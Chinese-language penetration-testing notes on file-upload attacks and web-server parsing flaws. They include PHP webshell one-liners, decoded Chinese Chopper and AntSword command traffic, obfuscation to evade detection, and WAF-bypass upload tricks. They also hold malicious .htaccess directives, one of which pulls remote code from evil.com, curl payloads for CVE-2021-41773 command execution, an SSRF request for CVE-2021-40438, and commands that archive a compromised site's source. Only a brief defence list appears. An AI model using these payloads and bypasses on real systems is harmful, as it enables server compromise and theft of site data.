## 文件上传

~~~bash
拿到webshell之后获取备份文件:
#	压缩目录
/usr/local/tomcat/webapps/ >tar -zcvf batman123.tar.gz ROOT
# 移动目录
mv /home/www/wework/batman123.tar.gz /home/www/wework/console/batman123.tar.gz
~~~





[![HnbnzT.png](https://s4.ax1x.com/2022/02/05/HnbnzT.png)](https://imgtu.com/i/HnbnzT)

这里额外强调一下：某些编辑器存在白名单验证，但是白名单的值是前端传过去的，我们可以修改，比如前端限制了你的格式必须是.jpg，.png，.jpeg这种，那么在发包时会一并传入过去（可能会有加密传输），那么我们在传入时可以把.jpg改成.asp，.php等脚本文件，然后上传小马

https://mp.weixin.qq.com/s/BcTotw2f1RxM-aLORNxvfQ

[![bvNNcQ.png](https://s1.ax1x.com/2022/03/15/bvNNcQ.png)](https://imgtu.com/i/bvNNcQ)

[![bvNdns.png](https://s1.ax1x.com/2022/03/15/bvNdns.png)](https://imgtu.com/i/bvNdns)

这里成功上传了123.aspx小马，如果aspx的马上不去就换asp



### 是什么

利用文件上传可执行代码，利用代码执行漏洞中可执行函数连接，实现getshell

### 为什么

后端代码过滤不严谨

### 怎么做

#### 基本用法

找到含有文件上传点的地方，比如头像，附件等，上传一句话，然后用webshell管理工具连接拿到webshell

#### 原理，执行流程

对四款工具进行分析，分别是中国菜刀（老古董），蚁剑，哥斯拉，冰蝎，后两者以后再弄

##### 中国菜刀

如果没有在代码字符串中调用 return 语句，则返回 NULL。如果代码中存在解析错误，则 eval() 函数返回 false

###### 1）连接

`<?php eval($_POST['op']); ?>`

发送的http请求一部分

`op=@eval(base64_decode($_POST[z0]));&z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0+fCIpOztwcmludCgiaGVsbG8gUEhQISIpOztlY2hvKCJ8PC0iKTtkaWUoKTs=`

把op进行eval代码执行，常见的代码执行函数有eval，assert，preg_replace，all_user_func，call_user_func_array，array_map，array_filter，create_function

z0后面base64解码

~~~php
@ini_set("display_errors","0");	//临时关闭PHP的错误显示功能
@set_time_limit(0);	//防止像dir、上传文件大马时超时
@set_magic_quotes_runtime(0);	//关闭魔术引号，这东西在4.0以后就不怎么用了
echo("->|");	//
;print("hello PHP!");	//
;echo("|<-");
die();	//	
~~~

###### 2）文件管理

`op=@eval(base64_decode($_POST[z0]));&z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskRD1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejEiXSk7JEY9QG9wZW5kaXIoJEQpO2lmKCRGPT1OVUxMKXtlY2hvKCJFUlJPUjovLyBQYXRoIE5vdCBGb3VuZCBPciBObyBQZXJtaXNzaW9uISIpO31lbHNleyRNPU5VTEw7JEw9TlVMTDt3aGlsZSgkTj1AcmVhZGRpcigkRikpeyRQPSRELiIvIi4kTjskVD1AZGF0ZSgiWS1tLWQgSDppOnMiLEBmaWxlbXRpbWUoJFApKTtAJEU9c3Vic3RyKGJhc2VfY29udmVydChAZmlsZXBlcm1zKCRQKSwxMCw4KSwtNCk7JFI9Ilx0Ii4kVC4iXHQiLkBmaWxlc2l6ZSgkUCkuIlx0Ii4kRS4iCiI7aWYoQGlzX2RpcigkUCkpJE0uPSROLiIvIi4kUjtlbHNlICRMLj0kTi4kUjt9ZWNobyAkTS4kTDtAY2xvc2VkaXIoJEYpO307ZWNobygifDwtIik7ZGllKCk7&z1=QzpcXGluZXRwdWJcXHd3d3Jvb3RcXA%3D%3D`

我们这里必须提一下base64加密原理

base64采用在a-z，A-Z，0-9，+，/，这64种字符进行转换，但是在url传递中+和/符号会被url编码成%xx这种，不利于传输，所以后期把他们替换成-和_

加密原理：将3个8bit的字符拆分为4个6bit的字符，并且对6bit的字符前面加上00补齐到8位，且每76个字符加一个换行符，最后的结束符也要处理

ascii码表http://c.biancheng.net/c/ascii/

比如s 1 3，转换前ascii对应为115 49 51，二进制数是01110011 00110001 00110011，分割为4x6再补齐00之后是

**00**011100 **00**110011 **00**000100 **00**110011

再转换为ascii28 51 4 51

查对下照表 c z E z

理解后就得到base64之后是4的倍数，先对代码url解码，再base64解码

`@ini_set("display_errors","0");@set_time_limit(0);@set_magic_quotes_runtime(0);echo("->|");;$D=base64_decode($_POST["z1"]);$F=@opendir($D);if($F==NULL){echo("ERROR:// Path Not Found Or No Permission!");}else{$M=NULL;$L=NULL;while($N=@readdir($F)){$P=$D."/".$N;$T=@date("Y-m-d H:i:s",@filemtime($P));@$E=substr(base_convert(@fileperms($P),10,8),-4);$R="\t".$T."\t".@filesize($P)."\t".$E."`
`";if(@is_dir($P))$M.=$N."/".$R;else $L.=$N.$R;}echo $M.$L;@closedir($F);};echo("|<-");die();&z1=C:\\inetpub\\wwwroot\\`

对代码整理一下

~~~php
$D=base64_decode($_POST["z1"]);
$F=@opendir($D); //opendir() 函数打开一个目录句柄，可由 closedir()，readdir() 和 rewinddir() 使用
if($F==NULL)
{
    echo("ERROR:// Path Not Found Or No Permission!");
}	//若成功，则该函数返回一个目录流，否则返回 false 以及一个 error。可以通过在函数名前加上 "@" 来隐藏 error 的输出。
else
{
    $M=NULL;
    $L=NULL;
    while($N=@readdir($F))	//readdir() 函数返回由 opendir() 打开的目录句柄中的条目。若成功，则该函数返回一个文件名，否则返回 false。
    {
        $P=$D."/".$N;
        $T=@date("Y-m-d H:i:s",@filemtime($P));
        @$E=substr(base_convert(@fileperms($P),10,8),-4);	//fileperms() 函数返回文件或目录的权限，fileperms这里把10进制转换为8进制，substr从倒数第四位开始返回
        $R="\t".$T."\t".@filesize($P)."\t".$E." ";//filesize() 函数返回指定文件的大小
        if(@is_dir($P))	
            $M.=$N."/".$R;
        else 
            $L.=$N.$R;
    }
    echo $M.$L;
    @closedir($F);
};
echo("|<-");
die();
~~~

###### 3）上传文件

这里上传文件需要具备修改文件的权限的

当表单中加入属性enctype="multipart/form-data"，传输方式为post的时候，我们上传的 文件会被编码为base64然后(根据浏览器可能有压缩)和HTTP头一起构成一整个HTTP数据包发送给服务器端。也就说，后面的这大段数据都是刚才 上传的图片。感觉就是菜刀客户端是在模拟一个表单传文件的行为，模拟出一个文件上传的POST数据包，发往服务器

~~~php
@ini_set("display_errors","0");@set_time_limit(0);@set_magic_quotes_runtime(0);echo("->|");;
$f=base64_decode($_POST["z1"]);
$c=$_POST["z2"];
$c=str_replace("\r","",$c);
$c=str_replace("\n","",$c);
$buf="";
for($i=0;$i<strlen($c);$i+=2)	
    $buf.=urldecode("%".substr($c,$i,2));
echo(@fwrite(fopen($f,"w"),$buf)?"1":"0");; //fopen w模式写入，fwrite将他名字返回
echo("|<-");
die();
&z1=C:\\inetpub\\wwwroot\\1.png
~~~

后面跟的那一大段数据都是z2)代码基本上来说最关键的就是那个fwrite，就是将我们指定的装满数据的缓冲区写入我们指定的一个路径中。只要 apache用户在当前目录下有写权限，php调用win api的时候就能完成写操作

###### 4）虚拟终端

~~~php
@ini_set("display_errors","0");@set_time_limit(0);@set_magic_quotes_runtime(0);echo("->|");;
$p=base64_decode($_POST["z1"]);
$s=base64_decode($_POST["z2"]);
$d=dirname($_SERVER["SCRIPT_FILENAME"]); //这里dirname是返回路径中的目录部分内容，$_SERVER["SCRIPT_FILENAME"]是当前执行程序的绝对路径及文件名

$c=substr($d,0,1)=="/"?"-c '{$s}'":"/c {$s}";	//这是一段正则表达式，用捕获分组获得字符串中的参数，这里也就是 cd /d "C:\wamp\www\、 dir、 echo、 cd、 echo
$r="{$p} {$c}";
@system($r." 2>&1");;
echo("|<-");
die();
&z1=cmd
&z2=cd /d "C:\wamp\www\"&dir&echo [S]&cd&echo [E]
~~~

##### 蚁剑

###### 1）连接

~~~php
@ini_set("display_errors", "0"); 报错不回显
@set_time_limit(0); 防止大马超时
function asenc($out){
	return $out;
};
function asoutput(){
$output=ob_get_contents(); //返回输出缓冲区的内容
ob_end_clean(); //清理(擦除)缓冲区并关闭输出缓冲
echo "c6b05fd97";
echo @asenc($output);echo "d69e35d304";}
ob_start(); //打开输出缓冲区
try{
$D=dirname($_SERVER["SCRIPT_FILENAME"]); //获取当前url路由的绝对路径
if($D=="")$D=dirname($_SERVER["PATH_TRANSLATED"]); //当前脚本所在文件系统（非文档根目录）的基本路径
$R="{$D}	";
if(substr($D,0,1)!="/"){
foreach(range("C","Z")as $L)if(is_dir("{$L}:"))$R.="{$L}:";
}
else{
$R.="/";}$R.="	";
$u=(function_exists("posix_getegid"))?@posix_getpwuid(@posix_geteuid()):"";
$s=($u)?$u["name"]:@get_current_user();
$R.=php_uname();
$R.="	{$s}";echo $R;;}catch(Exception $e){echo "ERROR://".$e->getMessage();};asoutput();die(); //获取目录，uid，系统信息，用户等信息
~~~

#### 实际中怎么用，达到什么效果

比如ctf中，不考虑waf直接上马然后连就完事了，在实战中要过waf，webshell和连接的流量特征要进行免杀，最后可以得到webshell

#### 衍生出场景，是否存在利用条件，条件是否苛刻

通常ctf会对一句话进行检验，比如<? eval($_POST[op]); ?>没有php，?，?可以用2%%替换，eval可能被过滤，要替换成其他的执行函数，通常来说对webshell马有·**三种方法**进行免杀处理

###### 1）免扩展加密(混淆加密)

比如`<?php echo 'hello by phpjiami.com'; ?>`

可以使用**代码执行**函数进行处理，比如eval

`<?php eval("echo 'hello by phpjiami.com';"); ?>`

再进行**base64_decode，base64_encode**

`<?php eval(base64_decode("ZWNobyAnaGVsbG8gYnkgcGhwamlhbWkuY29tJzs=")); ?>`

可以**先进行压缩，再进行base64**

基本思路是

 源码-》加密处理（压缩，替换，BASE64，转义）-》安全处理（验证文件MD5值，限制IP、限域名、限时间、防破解、防命令行调试）-》加密程序成品，再简单的说：源码+加密外壳==加密程序。

###### 2）变量覆盖

~~~php
<?php
    $a = $_GET['x']; 
    $$a = $_GET['y']; 
    $b($_POST['z']); 
?>
~~~

###### 3）异或加密

接下来我们在github上找一个webshell的项目尝试解密，[github地址1](https://hub.fastgit.org/tennc/webshell)，[github地址2](https://hub.fastgit.org/ysrc/webshell-sample) ，[解密文章地址]()

#### 绕过

![](https://z3.ax1x.com/2021/09/24/4B3dFx.png)

后缀名，类型、文件头等
后缀名:黑名单、白名单
文件类型:M工ME信息
文件头:内容头信息(GIF89a)
方法：查看源码、抓包修改包信息

##### 前端验证

前端验证可以抓包，删代码，禁用js

![](https://s4.ax1x.com/2021/12/17/TiqvCt.png)

##### 黑名单

###### 特殊解析后缀

php2，php3，php4，php5，php6，phtml

###### .htaccess解析

.htaccess文件是Apache服务器下的一个配置文件。其主要负责相关目录下的网页配置，即：在一个特定的文档目录中放置一个包含一个或多个指令的文件来对网页进行配置。
不过需要注意的是，.htaccess文件的作用域为其所在目录与其所有的子目录，不过若是子目录也存在.htaccess文件，则会覆盖父目录的.htaccess效果。

###### 大小写

###### 空格绕过

###### 点绕过

###### 双后缀名

###### ::$DATA

在window的时候如果文件名+`"::$DATA"`会把`::$DATA`之后的数据当成文件流处理,不会检测后缀名，且保持`::$DATA`之前的文件名，他的目的就是不检查后缀名

###### 常见过滤函数

trim移除字符串两侧的字符

deldot删除最后的.

strrchr查找字符串在另一个字符串中最后一次出现的位置，并返回从该位置到字符串结尾的所有字符

strtolower变成小写

str_ireplace去除字符串::$DATA

in_array在xxx数组

getimagesize获取图像信息

exif_imagetype — 判断一个图像的类型

##### 白名单

###### %00截断

../upload/1.php%001234124.jpg

0x00截断

0x0a截断

###### 文件头渲染

###### 二次渲染+条件竞争

##### 特殊waf绕过

###### 垃圾数据溢出



###### 符号变异（' " ;）

waf与webserver的差异，multipart协议中，文件名的形式为“filename=”abc.php””。但是Tomcat、PHP等容器解析协议时会做一些兼容，能正确解析 ”filename=”abc.php”、”filename=abc.php”、 ”filename=’abc.php’”。而WAF只按照协议标准去解析，无法解析文件名，但是后端容器能正确获得文件名，从而导致被绕过。场景的绕过形式：

~~~
Content-Disposition: form-data; name=”file”; filename=bc.php

Content-Disposition: form-data; name=”file”; filename=”abc.php

Content-Disposition: form-data; name=”file”; filename=’abc.php’
~~~

在抓包时可以尝试把bc.php的前后的双引号替换成单引号，或者左开右闭，左闭右开，单引号双引号混合搭配

###### 遗漏文件名

当WAF遇到“name=”myfile”;;”时，认为没有解析到filename。而后端容器继续解析到的文件名是t3.jsp，导致WAF被绕过

~~~
《Content-Disposition: form-data;name=”myfile”;; filename=”t3.jsp”》
~~~





###### 数据截断(%00 ; 换行)

%00截断：因为php是用c语言写的，在c语言中%00表示语句的结束，比如上传1.php%00.jpg时，waf会全部拦截，但是php代码执行时实际会得到1.php

换行解析：因为WebServer获取参数的灵活性，所以我尝试把安全狗拦截的filename=”test.asp”换个位置。经过一番测试，发现filename=”test.asp”位于Content-Type: application/octet-stream

下一行时，安全狗的上传拦截便会失效

###### 重复数据(参数多次)

协议解析不正确-未解析所有文件，multipart协议中，一个POST请求可以同时上传多个文件。如图，许多WAF只检查第一个上传文件，没有检查上传的所有文件，而实际后端容器会解析所有上传的文件名，攻击者只需把payload放在后面的文件PART，即可绕过。

[![bQ5wPU.png](https://s4.ax1x.com/2022/03/01/bQ5wPU.png)](https://imgtu.com/i/bQ5wPU)

###### 文件名覆盖

在multipart协议中，一个文件上传块存在多个Content-Disposition，将以最后一个Content-Disposition的filename值作为上传的文件名。许多WAF解析到第一个Content-Disposition就认为协议解析完毕，获得上传的文件名，从而导致被绕过。如图，加速乐的WAF解析得到文件名是”sp.pho”，但PHP解析结果是”sp.php”，导致被绕过



#### 高度武器化

比如冰蝎就是采用异或生成的方式，使得无法有效记录他的流量特征

#### 如何防御

（1）将文件上传目录的所有用户执行权限全部取消

（2）判断文件类型

使用MIME Type、后缀检查，推荐白名单方式，对于图片的处理，可以使用压缩函数或者resize函数，处理

图片的同时破坏图片中可能包含的HTML代码，使用白名单的时候，使用分割字符串(上传来的文件名)，使用"."来

分割，仅允许分割后，字符串只有两个，一 个是文件名，一个是文件扩展名

（3）使用随机数改写文件名和文件路径

（4）单独设置文件服务器的域名

（5）二次渲染

将上传的图片重新保存为一个新的图片，将里面可能含有的的可执行代码删除

（6）谨防某些日志文件，或者错误文件被写入，比如apache和nignx的error.log和access.log



### 解析漏洞

------

#### IIS

解析漏洞可以配合文件上传。将代码放在jpg里，解析成脚本语言运行

##### IIS 6.0

- 后缀解析 `/xx.asp;.jpg`

  服务器默认不解析 `;` 号及其后面的内容，相当于截断。

- 目录解析 `/xx.asp/xx.jpg` (xx.asp目录下任意解析)：目录解析漏洞是在网站目录下建一个asp为后缀的文件夹，然后文件夹下的.jpg、.txt、.doc等其他格式后缀的文件都会被解析为asp

- 默认解析 `xx.asa` `xx.cer` `xx.cdx`

- PROPFIND 栈溢出漏洞    RCE [CVE-2017-7269](https://blog.csdn.net/Fly_hps/article/details/79568430)：exp:<https://github.com/zcgonvh/cve-2017-7269>，由对方向我们的msf反弹shell，最后也可以提权

##### IIS 7.0-7.5 / Nginx <= 0.8.37

在Fast-CGI开启状态下，在文件路径后加上 `/xx.php` ，即 `xx.jpg/xx.php` 会被解析为php文件。

##### PUT漏洞

- 开启WebDAV
- 拥有来宾用户，且来宾用户拥有上传权限
- 可任意文件上传

拥有写入权限，用move的方法把webshell.txt变成webshell.asp

https://blog.csdn.net/xy_sugar/article/details/86753727

##### Windows特性

Windows不允许空格和点以及一些特殊字符作为结尾，创建这样的文件会自动重命名，所以可以使用 `xx.php[空格]` ， `xx.php.`， `xx.php/`， `xx.php::$DATA` 上传脚本文件。

这其实也可以算到文件上传漏洞里，waf绕过时还可以抓包换行，或者多写超过2096还是256 linux or windows...

##### 文件名猜解

工具：https://github.com/lijiejie/IIS_shortname_Scanner

在支持NTFS 8.3文件格式时，可利用短文件名猜解目录文件，区别于fat32，特征：

- 文件名为原文件名前6位字符加上 `~1` ，其中数字部分是递增的，如果存在前缀相同的文件，则后面的数字进行递增。
- 后缀名不超过3位，超过部分会被截断
- 所有小写字母均转换成大写的字母
- 文件名后缀长度大于等于4或者总长度大于等于9时才会生成短文件名，如果包含空格或者其他部分特殊字符，则无视长度条件

IIS 8.0之前的版本支持短文件名猜测的HTTP方法主要包括：DEBUG、OPTIONS、GET、POST、HEAD、TRACE六种，需要安装ASP.NET。而IIS 8.0之后的版本只能通过OPTIONS和TRACE方法猜测成功，但是没有ASP.NET的限制。

这种方法的局限性在于：

- 文件夹名前6位字符带点”.”，扫描程序会认为是文件而不是文件夹，最终出现误报
- 不支持中文文件名

这种方法可以通过命令 `fsutil behavior set disable8dot3 1` 关闭NTFS 8.3文件格式的支持来修复。

https://blog.csdn.net/qq_36304918/article/details/119774893

------

#### Apache

##### 后缀解析

`test.php.x1.x2.x3` （ x1,x2,x3 为没有在 mime.types 文件中定义的文件类型）。Apache 将从右往左开始判断后缀， 若x3为非可识别后缀，则判断x2，直到找到可识别后缀为止，然后对可识别后缀进行解析

##### .htaccess

当AllowOverride被启用时，上传启用解析规则的.htaccess

```
AddType application/x-httpd-php .jpg

```

```
php_value auto_append_file .htaccess
#<?php phpinfo();

```

```
Options ExecCGI
AddHandler cgi-script .jpg

```

```
Options +ExecCGI
AddHandler fcgid-script .gif
FcgidWrapper "/bin/bash" .gif

```

```
php_flag allow_url_include 1
php_value auto_append_file data://text/plain;base64,PD9waHAgcGhwaW5mbygpOw==
#php_value auto_append_file data://text/plain,%3C%3Fphp+phpinfo%28%29%3B
#php_value auto_append_file https://evil.com/evil-code.txt

```

##### 目录遍历

CVE-2021-41773

###### 漏洞利用

使用如下CURL命令来发送Payload（注意其中的`/icons/`必须是一个存在且可访问的目录）：

```shell
curl -v --path-as-is http://192.168.43.71:8080/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
```

在服务端开启了cgi或cgid这两个mod的情况下，这个路径穿越漏洞将可以执行任意命令：

```shell
curl -v --data "echo;id" 'http://192.168.43.71:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh'
```

配置 `Options +Indexes` 时Apache存在目录遍历漏洞。

修复：把Options +Indexes改成Options -Indexes

```php
Options -Indexes +FollowSymLinks +ExecCGI
AllowOverride All
Order allow,deny
Allow from all
Require all granted
```

谷歌语法：

intitle:index of	有的时候在挖掘漏洞过程中，假设有一张图片，可以右键复制图片的地址：

图片地址：http://www.baidu.com/admin/img/1.jpg

然后我们把图片文件删除并访问这个URL:http://www.baidu.com/admin/img/

这个时候就有可能会有目录遍历漏洞！

##### apache httpd 换行解析 CVE-2017-15715

`%0A` 绕过上传黑名单。

在1.php后面插入一个`\x0A`（注意，不能是`\x0D\x0A`，只能是一个`\x0A`），不再拦截

访问刚才上传的`/1.php%0a`，发现能够成功解析，但这个文件不是php后缀，说明目标存在解析漏洞

https://blog.csdn.net/nzjdsds/article/details/97248241

##### lighttpd

`xx.jpg/xx.php`

##### apache HTTP Server 2.4.48 mod_proxy SSRF漏洞

CVE-2021-40438，在其2.4.48及以前的版本中，mod_proxy模块存在一处逻辑错误导致攻击者可以控制反向代理服务器的地址，进而导致SSRF漏洞，后面的example.com就是代理地址

##### POC

```http
GET /?unix:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|http://example.com/ HTTP/1.1
Host: 192.168.1.162:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Connection: close
```

------

#### Nginx

##### Fast-CGI关闭

在Fast-CGI关闭的情况下， Nginx 仍然存在解析漏洞： 在文件路径(xx.jpg)后面加上 `%00.php` ， 即 `xx.jpg%00.php` 会被当做 php 文件来解析

##### Fast-CGI开启

在Fast-CGI开启状态下，在文件路径后加上 `/xx.php` ，则 `xx.jpg/xx.php` 会被解析为php文件

##### CVE-2013-4547

`a.jpg\x20\x00.php`

https://www.cnblogs.com/bmjoker/p/9838600.html

##### 配置错误

##### 目录穿越

如果配置中存在类似 `location /foo { alias /bar/; }` 的配置时，`/foo../` 会被解析为 `/bar/../` 从而导致目录穿越的发生。

##### 目录遍历

配置中 `autoindex on` 开启时，Nginx中存在目录遍历漏洞。

##### CRLF

https://blog.csdn.net/weixin_40412037/article/details/106217834?spm=1001.2101.3001.6650.1&utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7Edefault-1.no_search_link&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7Edefault-1.no_search_link



##### .htaccess

~~~php
<ifModule mime_module>
AddHandler php5-script .jpg
<!-- 将.jpg文件按照php代码进行解析执行 -->
AddType application/x-httpd-php .jpg
<!-- 将.jpg文件按照php代码进行解析执行 -->
Sethandler application/x-httpd-php
<!-- 将该目录及子目录下的文件均按照php文件解析执行 -->
</ifModule>    
    
<!-- 该种匹配方式并不推荐，极易造成误伤 -->
    
<FilesMatch "muma.jpg">
Sethandler application/x-httpd-php
<!-- 将匹配到的 muma.jpg 文件按照php解析执行 -->
Addhandler php5-script .jpg
<!-- 将匹配到的 muma.jpg 文件按照php解析执行 -->
</FilesMatch>
<!-- 该种匹配方式较为精准，不会造成大批的误伤情况 -->
~~~

##### .user.ini

~~~
跟.htaccess后门比，适用范围更广，nginx/apache/IIS都有效，而.htaccess只适用于apache 作者：掌控安全学院 https://www.bilibili.com/read/cv8718378/ 出处：bilibili

auto_prepend_file/auto_append_file

